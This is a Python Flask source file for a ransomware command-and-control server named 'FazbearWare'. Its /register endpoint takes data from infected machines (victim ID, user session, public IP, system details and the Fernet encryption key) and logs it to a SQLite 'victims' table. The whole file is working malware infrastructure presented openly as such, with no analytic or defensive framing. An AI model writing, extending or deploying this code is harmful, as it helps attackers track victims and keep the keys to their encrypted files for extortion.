"""
C2 SERVER 
Description: 
"""
from flask import Flask,request
import sqlite3

# APP INSTANCE
app = Flask(__name__)

#DATABASE
DATABASE = "fazbearware.db"

def init_db():
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            victim_id TEXT UNIQUE,
            user_session TEXT,
            ip_address TEXT,
            system_details TEXT,
            fernet_key TEXT
        )
    ''')
    conn.commit()
    conn.close()
    print(f"[*] Database {DATABASE} initialized.") 

# REGISTER PATHS
@app.route('/')
def home():
    return "FazbearWare C2 Server"

@app.route('/register',methods=['POST'])
def victim_register():
    data = request.get_json()
    if data:
        victim = data.get("victim_ID")
        user = data.get("current_user")
        ip = data.get("public_ip")
        sys_info = data.get("system_info")
        key = data.get("key")

        print(f"\n[!] Endpoint detected")
        print(f"[*] -----------------------------------------")
        print(f"[+] Victim ID    : {victim}")
        print(f"[+] Fernet Key   : {key}")
        print(f"[+] User Session : {user}")
        print(f"[+] Public IP    : {ip}")
        print(f"[+] System Info  : {sys_info}")
        print(f"[*] -----------------------------------------")

        #SAVE INFO IN SQLITE3 DATABASE 
        try:
            conn = sqlite3.connect(DATABASE)
            cursor = conn.cursor()
            cursor.execute('''
                INSERT OR IGNORE INTO victims (victim_id, user_session, ip_address, system_details, fernet_key)
                VALUES (?, ?, ?, ?, ?)
            ''', (victim, user, ip, str(sys_info), key))
            conn.commit()
            conn.close()
            print(f"[!] Data stored successfully in {DATABASE}")
        except Exception as e:
            print(f"[X] Database Error: {e}")

        return {"status": "success", "message": "ID OK"}, 200
    
    return {"status": "error", "message": "No data send"}, 400

# EXECUTE SERVER IN LOCALHOST PORT 5000
if __name__ == '__main__':
    init_db()  
    app.run(port=5000, debug=True)